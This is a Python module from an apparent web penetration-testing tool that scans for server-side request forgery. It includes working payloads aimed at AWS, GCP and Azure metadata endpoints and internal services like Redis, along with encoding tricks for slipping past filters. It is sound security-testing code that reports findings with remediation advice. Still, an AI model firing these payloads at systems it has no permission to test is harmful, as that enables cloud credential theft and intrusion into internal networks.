"""Server-Side Request Forgery (SSRF) testing."""

from __future__ import annotations

import re
from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.injection import param_names
from pencheff.modules.base import BaseTestModule

# SSRF payloads targeting internal services
SSRF_PAYLOADS = [
    # Cloud metadata services
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "security-credentials", "iam"], "AWS Metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", ["project", "zone", "instance"], "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId"], "Azure Metadata"),
    # Internal services
    ("http://127.0.0.1:80/", [], "Localhost HTTP"),
    ("http://127.0.0.1:8080/", [], "Localhost 8080"),
    ("http://127.0.0.1:3000/", [], "Localhost 3000"),
    ("http://localhost:6379/", ["redis", "ERR"], "Redis"),
    ("http://localhost:9200/", ["elasticsearch", "cluster_name", "tagline"], "Elasticsearch"),
    # Bypass techniques
    ("http://0.0.0.0/", [], "Zero address bypass"),
    ("http://[::1]/", [], "IPv6 localhost"),
    ("http://0177.0.0.1/", [], "Octal bypass"),
    ("http://2130706433/", [], "Decimal bypass"),
    ("http://0x7f000001/", [], "Hex bypass"),
]

# Parameters commonly vulnerable to SSRF
SSRF_PARAM_NAMES = [
    "url", "uri", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "callback", "return",
    "next", "path", "file", "page", "feed", "host", "site", "html",
    "val", "validate", "domain", "return_url", "open", "nav", "navigation",
    "image", "img", "load", "fetch", "proxy", "request",
]


class SSRFModule(BaseTestModule):
    name = "ssrf"
    category = "injection"
    owasp_categories = ["A10"]
    description = "Server-Side Request Forgery testing"

    def get_techniques(self) -> list[str]:
        return ["cloud_metadata", "internal_scan", "bypass_techniques"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        endpoints = self._get_target_endpoints(session, targets)

        # Find params likely to be vulnerable
        ssrf_targets = []
        for ep in endpoints:
            for param in param_names(ep.get("params", [])):
                if param.lower() in SSRF_PARAM_NAMES:
                    ssrf_targets.append((ep, param))

        # Also check URL parameters in discovered endpoints
        for ep in endpoints:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(ep["url"])
            qs = parse_qs(parsed.query)
            for param, values in qs.items():
                if param.lower() in SSRF_PARAM_NAMES:
                    ssrf_targets.append((ep, param))
                # Check if any value looks like a URL
                for v in values:
                    if v.startswith("http://") or v.startswith("https://"):
                        ssrf_targets.append((ep, param))

        # Generate OAST callback URLs for blind SSRF detection
        from pencheff.core.oast import get_oast
        oast = get_oast(session.id)
        oast_http = oast.new_url("ssrf-blind")
        oast_dns = oast.new_dns("ssrf-dns")
        oast_payloads = [
            (oast_http, [], f"OAST HTTP callback ({oast_http[:40]}...)"),
            (f"http://{oast_dns}/", [], f"OAST DNS callback ({oast_dns[:40]}...)"),
        ]
        all_ssrf_payloads = SSRF_PAYLOADS[:6] + oast_payloads

        for ep, param in ssrf_targets[:15]:
            url = ep["url"]
            method = ep.get("method", "GET")

            for payload_url, markers, desc in all_ssrf_payloads:  # test top payloads
                try:
                    from urllib.parse import urlparse as _parse, parse_qs as _pqs, urlencode, urlunparse
                    parsed = _parse(url)
                    qs = _pqs(parsed.query, keep_blank_values=True)

                    if method == "GET":
                        qs[param] = [payload_url]
                        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                        resp = await http.get(test_url, module="ssrf")
                    else:
                        body_params = {p: _pqs(parsed.query).get(p, [""])[0] for p in _pqs(parsed.query)}
                        body_params[param] = payload_url
                        resp = await http.post(
                            url, body=urlencode(body_params),
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            module="ssrf",
                        )

                    body = resp.text.lower()
                    matched = any(m.lower() in body for m in markers) if markers else False

                    # Also check for non-error responses to internal URLs
                    if matched or (resp.status_code == 200 and "169.254" in payload_url and len(resp.text) > 50):
                        sev = Severity.CRITICAL if "Metadata" in desc else Severity.HIGH
                        findings.append(Finding(
                            title=f"Server-Side Request Forgery ({desc})",
                            severity=sev,
                            category="injection",
                            owasp_category="A10",
                            description=f"SSRF in parameter '{param}'. Server fetched internal URL: {payload_url}. "
                                        f"{'Cloud metadata accessible — credential theft possible.' if 'Metadata' in desc else ''}",
                            remediation="Validate and whitelist allowed URLs. Block internal/private IP ranges. "
                                        "Disable cloud metadata endpoint or use IMDSv2 with hop limit.",
                            endpoint=url,
                            parameter=param,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N" if "Metadata" in desc
                                       else "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
                            cvss_score=9.9 if "Metadata" in desc else 6.5,
                            cwe_id="CWE-918",
                            evidence=[Evidence(
                                request_method=method,
                                request_url=url,
                                request_body=f"{param}={payload_url}",
                                response_status=resp.status_code,
                                response_body_snippet=resp.text[:300],
                                description=f"SSRF target: {desc}",
                            )],
                        ))
                        break
                except Exception:
                    continue

        return findings
